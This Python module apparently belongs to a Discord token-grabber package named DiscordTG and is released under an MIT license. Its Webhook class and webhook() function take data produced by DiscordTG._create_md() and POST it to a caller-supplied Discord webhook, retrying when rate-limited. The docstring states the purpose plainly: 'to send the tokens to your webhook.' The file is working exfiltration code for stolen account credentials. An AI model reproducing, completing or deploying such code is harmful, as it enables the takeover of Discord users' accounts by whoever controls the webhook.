# MIT License
#
# Copyright (c) 2022 Rahul Nanwani
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.


from json import loads
from time import sleep

from requests import post

from .script import DiscordTG


class Webhook:
    def __init__(self, url: str):
        self.__url = url
        # noinspection PyProtectedMember
        self.content = DiscordTG._create_md()

    @property
    def __json(self) -> dict:
        data = dict()
        for key, value in self.__dict__.items():
            if value and key not in ["url"]:
                data[key] = value
        return data

    def _execute(self) -> int:
        response = post(self.__url, json=self.__json, params={'wait': True})
        while response.status_code == 429:
            errors = loads(
                response.content.decode('utf-8'))
            retry_after = (int(errors['retry_after']) / 1000) + 0.15
            sleep(retry_after)
            response = post(self.__url, json=self.__json, params={'wait': True})
        return response.status_code


# noinspection PyProtectedMember
def webhook(url: str) -> int:
    """
    Call this method to send the tokens to your webhook
    :param url: your discord webhook url (string)
    :return: response code (int)
    """
    return Webhook(url)._execute()
